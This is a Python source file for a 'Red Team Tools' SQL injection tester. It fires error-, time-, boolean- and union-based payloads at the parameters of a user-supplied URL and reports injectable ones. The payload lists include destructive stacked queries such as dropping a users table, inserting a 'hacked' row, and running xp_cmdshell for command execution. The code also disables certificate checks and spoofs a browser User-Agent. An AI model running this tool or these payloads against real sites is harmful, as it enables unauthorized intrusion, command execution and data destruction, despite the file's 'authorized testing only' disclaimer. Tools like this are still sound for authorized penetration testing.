#!/usr/bin/env python3
"""
Red Team Tools - SQL Injection Tester
For educational and authorized security testing only
"""

import re
import time
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
import sys
import os

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from utils import *

try:
    import requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    REQUESTS_AVAILABLE = True
except Exception as e:
    REQUESTS_AVAILABLE = False
    REQUESTS_ERROR = str(e)


class SQLiTester:
    """SQL Injection testing tool"""
    
    # Error-based detection patterns
    ERROR_PATTERNS = [
        # MySQL
        r"SQL syntax.*MySQL",
        r"Warning.*mysql_",
        r"MySqlClient\.",
        r"valid MySQL result",
        r"check the manual that corresponds to your (MySQL|MariaDB) server version",
        
        # PostgreSQL
        r"PostgreSQL.*ERROR",
        r"Warning.*\Wpg_",
        r"valid PostgreSQL result",
        r"Npgsql\.",
        
        # Microsoft SQL Server
        r"Driver.* SQL[\-\_\ ]*Server",
        r"OLE DB.* SQL Server",
        r"SQLServer JDBC Driver",
        r"\bSQL Server\b.*Driver",
        r"Warning.*mssql_",
        r"Procedure or function.*\b(too many|too few)\b",
        r"Unclosed quotation mark after the character string",
        
        # Oracle
        r"\bORA-\d{5}",
        r"Oracle error",
        r"Oracle.*Driver",
        r"Warning.*\Woci_",
        r"Warning.*\Wora_",
        
        # SQLite
        r"SQLite/JDBCDriver",
        r"SQLite\.Exception",
        r"System\.Data\.SQLite\.SQLiteException",
        r"Warning.*sqlite_",
        r"Warning.*SQLite3::",
        
        # Generic
        r"SQL error.*POS([0-9]+)",
        r"quoted string not properly terminated",
        r"SQL command not properly ended",
        r"unexpected end of SQL command",
        r"Invalid query",
        r"SQL syntax",
        r"syntax error",
    ]
    
    # SQLi payloads
    PAYLOADS = {
        "error_based": [
            "'",
            "\"",
            "'--",
            "\"--",
            "' OR '1'='1",
            "\" OR \"1\"=\"1",
            "' OR '1'='1'--",
            "' OR '1'='1'/*",
            "1' ORDER BY 1--",
            "1' ORDER BY 100--",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
        ],
        "time_based": [
            "'; WAITFOR DELAY '0:0:5'--",
            "'; SELECT SLEEP(5)--",
            "' AND SLEEP(5)--",
            "1' AND SLEEP(5)#",
            "'; SELECT pg_sleep(5)--",
            "1; WAITFOR DELAY '0:0:5'--",
        ],
        "boolean_based": [
            "' AND '1'='1",
            "' AND '1'='2",
            "' OR '1'='1",
            "' OR '1'='2",
            "1 AND 1=1",
            "1 AND 1=2",
            "1' AND 1=1--",
            "1' AND 1=2--",
        ],
        "union_based": [
            "' UNION SELECT 1--",
            "' UNION SELECT 1,2--",
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT 1,2,3,4--",
            "' UNION SELECT 1,2,3,4,5--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION ALL SELECT 1,2,3--",
        ],
        "stacked": [
            "'; DROP TABLE users--",
            "'; INSERT INTO users VALUES(1,'hacked','hacked')--",
            "; EXEC xp_cmdshell('whoami')--",
        ]
    }
    
    def __init__(self, target_url: str, timeout: float = 10.0):
        self.target_url = target_url
        self.timeout = timeout
        self.vulnerabilities = []
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
    
    def _check_error(self, response_text: str) -> str:
        """Check for SQL error messages in response"""
        for pattern in self.ERROR_PATTERNS:
            if re.search(pattern, response_text, re.IGNORECASE):
                return pattern
        return ""
    
    def _get_baseline(self, url: str, param: str, method: str = 'get') -> tuple:
        """Get baseline response for comparison"""
        try:
            if method.lower() == 'get':
                response = self.session.get(url, timeout=self.timeout, verify=False)
            else:
                parsed = urlparse(url)
                params = parse_qs(parsed.query)
                response = self.session.post(
                    f"{parsed.scheme}://{parsed.netloc}{parsed.path}",
                    data=params,
                    timeout=self.timeout,
                    verify=False
                )
            return len(response.content), response.elapsed.total_seconds()
        except:
            return 0, 0
    
    def test_error_based(self, url: str, param: str, method: str = 'get') -> list:
        """Test for error-based SQLi"""
        results = []
        
        for payload in self.PAYLOADS["error_based"]:
            try:
                parsed = urlparse(url)
                params = parse_qs(parsed.query)
                
                # Add payload to parameter
                original = params.get(param, [''])[0]
                params[param] = [original + payload]
                
                if method.lower() == 'get':
                    new_query = urlencode(params, doseq=True)
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
                    response = self.session.get(test_url, timeout=self.timeout, verify=False)
                else:
                    response = self.session.post(
                        f"{parsed.scheme}://{parsed.netloc}{parsed.path}",
                        data=params,
                        timeout=self.timeout,
                        verify=False
                    )
                
                error_pattern = self._check_error(response.text)
                if error_pattern:
                    results.append({
                        'type': 'error_based',
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'error_pattern': error_pattern
                    })
                    break
            except:
                continue
        
        return results
    
    def test_time_based(self, url: str, param: str, method: str = 'get', 
                       delay: float = 5.0) -> list:
        """Test for time-based blind SQLi"""
        results = []
        
        # Get baseline response time
        _, baseline_time = self._get_baseline(url, param, method)
        
        for payload in self.PAYLOADS["time_based"]:
            try:
                parsed = urlparse(url)
                params = parse_qs(parsed.query)
                
                original = params.get(param, [''])[0]
                params[param] = [original + payload]
                
                start_time = time.time()
                
                if method.lower() == 'get':
                    new_query = urlencode(params, doseq=True)
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
                    response = self.session.get(test_url, timeout=self.timeout + delay + 2, verify=False)
                else:
                    response = self.session.post(
                        f"{parsed.scheme}://{parsed.netloc}{parsed.path}",
                        data=params,
                        timeout=self.timeout + delay + 2,
                        verify=False
                    )
                
                elapsed = time.time() - start_time
                
                # Check if response was delayed
                if elapsed >= delay - 1:
                    results.append({
                        'type': 'time_based',
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'delay': elapsed
                    })
                    break
            except requests.exceptions.Timeout:
                # Timeout could indicate successful injection
                results.append({
                    'type': 'time_based',
                    'url': url,
                    'parameter': param,
                    'payload': payload,
                    'delay': 'timeout'
                })
                break
            except:
                continue
        
        return results
    
    def test_boolean_based(self, url: str, param: str, method: str = 'get') -> list:
        """Test for boolean-based blind SQLi"""
        results = []
        
        # Get baseline
        baseline_len, _ = self._get_baseline(url, param, method)
        
        true_payloads = ["' AND '1'='1", "1 AND 1=1", "' OR '1'='1"]
        false_payloads = ["' AND '1'='2", "1 AND 1=2", "' OR '1'='2"]
        
        for true_payload, false_payload in zip(true_payloads, false_payloads):
            try:
                parsed = urlparse(url)
                params = parse_qs(parsed.query)
                
                # Test true condition
                original = params.get(param, [''])[0]
                params[param] = [original + true_payload]
                
                if method.lower() == 'get':
                    new_query = urlencode(params, doseq=True)
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
                    true_response = self.session.get(test_url, timeout=self.timeout, verify=False)
                else:
                    true_response = self.session.post(
                        f"{parsed.scheme}://{parsed.netloc}{parsed.path}",
                        data=params,
                        timeout=self.timeout,
                        verify=False
                    )
                
                true_len = len(true_response.content)
                
                # Test false condition
                params[param] = [original + false_payload]
                
                if method.lower() == 'get':
                    new_query = urlencode(params, doseq=True)
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
                    false_response = self.session.get(test_url, timeout=self.timeout, verify=False)
                else:
                    false_response = self.session.post(
                        f"{parsed.scheme}://{parsed.netloc}{parsed.path}",
                        data=params,
                        timeout=self.timeout,
                        verify=False
                    )
                
                false_len = len(false_response.content)
                
                # Compare responses
                if abs(true_len - false_len) > 100:  # Significant difference
                    results.append({
                        'type': 'boolean_based',
                        'url': url,
                        'parameter': param,
                        'true_payload': true_payload,
                        'false_payload': false_payload,
                        'true_length': true_len,
                        'false_length': false_len
                    })
                    break
            except:
                continue
        
        return results
    
    def full_scan(self, url: str = None, param: str = None) -> list:
        """Run full SQLi scan"""
        url = url or self.target_url
        
        print(f"\n{C}{'═' * 60}{RESET}")
        print(f"{BRIGHT}SQL INJECTION SCAN{RESET}")
        print(f"{C}{'═' * 60}{RESET}")
        print(f"{Y}Target:{RESET} {url}")
        print()
        
        # Get parameters
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params:
            warning("No URL parameters found")
            return []
        
        # If specific param provided, only test that
        if param:
            params = {param: params.get(param, [''])}
        
        info(f"Testing {len(params)} parameters: {', '.join(params.keys())}")
        print()
        
        all_results = []
        
        for param_name in params:
            print(f"{Y}Testing parameter:{RESET} {param_name}")
            
            # Error-based
            info("  Checking error-based SQLi...")
            error_results = self.test_error_based(url, param_name)
            if error_results:
                success(f"  Error-based SQLi found!")
                all_results.extend(error_results)
            
            # Time-based
            info("  Checking time-based blind SQLi...")
            time_results = self.test_time_based(url, param_name)
            if time_results:
                success(f"  Time-based blind SQLi found!")
                all_results.extend(time_results)
            
            # Boolean-based
            info("  Checking boolean-based blind SQLi...")
            bool_results = self.test_boolean_based(url, param_name)
            if bool_results:
                success(f"  Boolean-based blind SQLi found!")
                all_results.extend(bool_results)
            
            print()
        
        self.vulnerabilities = all_results
        return all_results
    
    def print_results(self):
        """Print scan results"""
        print(f"\n{C}{'═' * 60}{RESET}")
        print(f"{BRIGHT}SQL INJECTION SCAN RESULTS{RESET}")
        print(f"{C}{'═' * 60}{RESET}")
        
        if not self.vulnerabilities:
            success("No SQL injection vulnerabilities found")
            return
        
        warning(f"Found {len(self.vulnerabilities)} potential SQL injection vulnerabilities!")
        
        for i, vuln in enumerate(self.vulnerabilities, 1):
            print(f"\n{R}[Vulnerability {i}]{RESET}")
            print(f"  Type: {vuln['type']}")
            print(f"  URL: {vuln['url']}")
            print(f"  Parameter: {vuln['parameter']}")
            
            if vuln['type'] == 'error_based':
                print(f"  Payload: {vuln.get('payload', 'N/A')}")
                print(f"  Error Pattern: {vuln.get('error_pattern', 'N/A')[:50]}...")
            elif vuln['type'] == 'time_based':
                print(f"  Payload: {vuln.get('payload', 'N/A')}")
                print(f"  Delay: {vuln.get('delay', 'N/A')}")
            elif vuln['type'] == 'boolean_based':
                print(f"  True Payload: {vuln.get('true_payload', 'N/A')}")
                print(f"  Response Diff: {abs(vuln.get('true_length', 0) - vuln.get('false_length', 0))} bytes")


def interactive_mode():
    """Interactive mode for SQL injection testing"""
    print_banner("SQLI TESTER", color="red")
    warning("For authorized security testing only!")
    
    target = prompt("Enter target URL with parameters (e.g., http://site.com/page?id=1)")
    
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target
    
    if '?' not in target:
        error("URL must contain parameters (e.g., ?id=1)")
        return
    
    options = [
        "Full Scan (All Tests)",
        "Error-Based Only",
        "Time-Based Blind Only",
        "Boolean-Based Blind Only"
    ]
    
    choice = menu_selector(options, "Select Test Type")
    
    if choice == 0:
        return
    
    tester = SQLiTester(target)
    
    # Get parameters
    parsed = urlparse(target)
    params = list(parse_qs(parsed.query).keys())
    
    if len(params) > 1:
        print(f"\n{Y}Available parameters:{RESET} {', '.join(params)}")
        param_choice = prompt("Enter parameter to test (or 'all')")
        if param_choice.lower() != 'all' and param_choice in params:
            params = [param_choice]
    
    if choice == 1:
        tester.full_scan()
    elif choice == 2:
        for param in params:
            results = tester.test_error_based(target, param)
            tester.vulnerabilities.extend(results)
    elif choice == 3:
        for param in params:
            results = tester.test_time_based(target, param)
            tester.vulnerabilities.extend(results)
    elif choice == 4:
        for param in params:
            results = tester.test_boolean_based(target, param)
            tester.vulnerabilities.extend(results)
    
    tester.print_results()


if __name__ == "__main__":
    interactive_mode()
